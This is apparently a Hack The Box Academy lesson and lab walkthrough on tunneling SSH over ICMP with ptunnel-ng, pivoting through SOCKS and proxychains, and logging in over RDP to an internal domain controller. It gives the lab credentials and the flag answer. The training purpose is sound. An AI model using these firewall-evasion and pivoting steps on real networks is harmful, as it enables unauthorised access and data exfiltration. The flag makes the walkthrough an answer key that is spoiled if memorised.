
---

ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.

---

## Setting Up & Using ptunnel-ng

If ptunnel-ng is not on our attack host, we can clone the project using git.

#### Cloning Ptunnel-ng



```shell-session
xF1NN@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```

Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.sh` script located at the root of the ptunnel-ng directory.

#### Building Ptunnel-ng with Autogen.sh



```shell-session
xF1NN@htb[/htb]$ sudo ./autogen.sh 
```

After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the `-r` option with SCP.

#### Alternative approach of building a static binary



```shell-session
xF1NN@htb[/htb]$ sudo apt install automake autoconf -y
xF1NN@htb[/htb]$ cd ptunnel-ng/
xF1NN@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
xF1NN@htb[/htb]$ ./autogen.sh
```

#### Transferring Ptunnel-ng to the Pivot Host



```shell-session
xF1NN@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.

#### Starting the ptunnel-ng Server on the Target Host



```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.

Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

#### Connecting to ptunnel-ng Server from Attack Host


```shell-session
xF1NN@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

#### Tunneling an SSH connection through an ICMP

```shell-session
xF1NN@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 May 2022 03:10:15 PM UTC

  System load:             0.0
  Usage of /:              39.6% of 13.72GB
  Memory usage:            37%
  Swap usage:              0%
  Processes:               183
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

144 updates can be applied immediately.
97 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$ 
```

If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.

On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.

#### Viewing Tunnel Traffic Statistics


```shell-session
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

#### Enabling Dynamic Port Forwarding over SSH


```shell-session
xF1NN@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

#### Proxychaining through the ICMP Tunnel

  ICMP Tunneling with SOCKS

```shell-session
xF1NN@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

---

## Network Traffic Analysis Considerations

It is important that we confirm the tools we are using are performing as advertised and that we have set up & are operating them properly. In the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like `Wireshark`. Take a close look at the short clip below.

![GIF showcasing the SSH traffic in Wireshark.](https://academy.hackthebox.com/storage/modules/158/analyzingTheTraffic.gif)

In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that `TCP` & `SSHv2` traffic is captured.

The command used in the clip: `ssh ubuntu@10.129.202.64`

In the second part of this clip, a connection is established over SSH using ICMP tunneling. Notice the type of traffic that is captured when this is performed.

Command used in clip: `ssh -p2222 -lubuntu 127.0.0.1`

---

Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.

Note: Consider the versions of GLIBC, make sure you are on par with the one on the target.

---
### "Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer."

On `Pwnbox`/`PMVPN`, students need to clone the [ptunnel-ng](https://github.com/utoni/ptunnel-ng.git) repository and then statically build it with the "autogen.sh" script:

Code: shell

```shell
git clone https://github.com/utoni/ptunnel-ng.git
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~]
└──╼ [★]$ git clone https://github.com/utoni/ptunnel-ng.git

Cloning into 'ptunnel-ng'...
remote: Enumerating objects: 1412, done.
remote: Counting objects: 100% (318/318), done.
remote: Compressing objects: 100% (136/136), done.
remote: Total 1412 (delta 186), reused 295 (delta 174), pack-reused 1094 (from 1)
Receiving objects: 100% (1412/1412), 709.91 KiB | 22.90 MiB/s, done.
Resolving deltas: 100% (908/908), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~]
└──╼ [★]$ sudo apt install automake autoconf -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
automake is already the newest version (1:1.16.5-1.3).
autoconf is already the newest version (2.71-3).
The following packages were automatically installed and are no longer required:
  espeak-ng-data geany-common libamd2 libbabl-0.1-0 libbrlapi0.8 libcamd2
  libccolamd2 libcholmod3 libdotconf0 libept1.6.0 libespeak-ng1 libgegl-0.4-0
  libgegl-common libgimp2.0 libmetis5 libmng1 libmypaint-1.5-1
  libmypaint-common libpcaudio0 libsonic0 libspeechd2 libtorrent-rasterbar2.0
  libumfpack5 libwmf-0.2-7 libwpe-1.0-1 libwpebackend-fdo-1.0-1 libxapian30
  node-clipboard node-prismjs python3-brlapi python3-louis python3-pyatspi
  python3-speechd sound-icons speech-dispatcher-audio-plugins xbrlapi xkbset
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 182 not upgraded.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~]
└──╼ [★]$ cd ptunnel-ng/

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~/ptunnel-ng]
└──╼ [★]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-1dos1dn7rk]─[~/ptunnel-ng]
└──╼ [★]$ ./autogen.sh 

++ pwd
+ OLD_WD=/home/htb-ac-8414/ptunnel-ng
++ dirname ./autogen.sh
+ NEW_WD=.
+ cd .
+ autoreconf -fi

<SNIP>
```

Then, students need to transfer the `ptunnel-ng` directory to the spawned Ubuntu target, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp -r ptunnel-ng ubuntu@STMIP
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp -r ptunnel-ng ubuntu@10.129.151.105:~/
ubuntu@10.129.151.105's password: 

applypatch-msg.sample     100%  478     5.2KB/s   00:00    
commit-msg.sample         100%  896    10.0KB/s   00:00    
fsmonitor-watchman.sample 100% 4655    51.3KB/s   00:00    
post-update.sample        100%  189     2.1KB/s   00:00    
pre-applypatch.sample     100%  424     4.7KB/s   00:00

<SNIP>
```

Thereafter, students need to use SSH to connect to the spawned Ubuntu pivot host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~/chisel]
└──╼ [★]$ ssh ubuntu@10.129.151.105
ubuntu@10.129.151.105's password:

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Mon Aug 29 16:01:34 2022 from 10.10.14.17
ubuntu@WEB01:~$
```

After connecting successfully, students need to run `ptunnel-ng` as a server:

Code: shell

```shell
sudo ./ptunnel-ng/src/ptunnel-ng -rSTMIP -R22
```

  ICMP Tunneling with SOCKS

```shell-session
ubuntu@WEB01:~$ sudo ./ptunnel-ng/src/ptunnel-ng -r10.129.151.105 -R22

[sudo] password for ubuntu: 
./ptunnel-ng/src/ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng/src/ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

Subsequently, from `Pwnbox`/`PMVPN`, students need to run `ptunnel-ng` as a client to connect to the server running on the Ubuntu pivot host:

Code: shell

```shell
sudo ./ptunnel-ng/src/ptunnel-ng -pSTMIP -l2222 -rSTMIP -R22
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo ./ptunnel-ng/src/ptunnel-ng -p10.129.151.105 -l2222 -r10.129.151.105 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

Then, from `Pwnbox`/`PMVPN`, students need to connect to the target Ubuntu pivot host using the established ICMP tunnel and SSH, testing if it is possible to connect to the target via the tunnel, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -p2222 -lubuntu 127.0.0.1
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -p2222 -lubuntu 127.0.0.1

The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ECDSA) to the list of known hosts.
ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Mon Aug 29 17:09:32 2022 from 10.10.14.17
ubuntu@WEB01:~$ 
```

Now that the test succeeded, from `Pwnbox`/`PMVPN`, students need to connect to the spawned Ubuntu pivot host using the established ICMP tunnel and SSH dynamic port forwarding to setup for proxychain-ing, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
ubuntu@127.0.0.1's password: 

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<SNIP>

Last login: Mon Aug 29 17:18:45 2022 from 10.129.151.105
ubuntu@WEB01:~$
```

Then, from `Pwnbox`/`PMVPN`, students need to use `proxychains` to connect to the DC on the internal network, utilizing the credentials `victor:pass@123`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /dynamic-resolution
```

  ICMP Tunneling with SOCKS

```shell-session
┌─[us-academy-1]─[10.10.14.17]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /dynamic-resolution

ProxyChains-3.1 (http://proxychains.sf.net)
[18:41:24:713] [5728:5729] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.19:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  40:95:ac:ba:4e:1e:99:d0:99:eb:ce:5f:d0:c8:a8:18:85:52:5e:2d:7b:9d:d5:e1:57:7f:6e:8d:ef:ac:66:d5
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

![[PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_20.png]]

Students, at last, need to print out the contents of the flag file "flag.txt" under the directory `C:\Users\victor\Downloads\` to attain `N3Tw0rkTunnelV1sion!`:

Code: cmd

```cmd
type .\Downloads\flag.txt.txt
```

  ICMP Tunneling with SOCKS

```cmd-session
C:\Users\victor>type .\Downloads\flag.txt.txt

N3Tw0rkTunnelV1sion!
```

Answer: {hidden}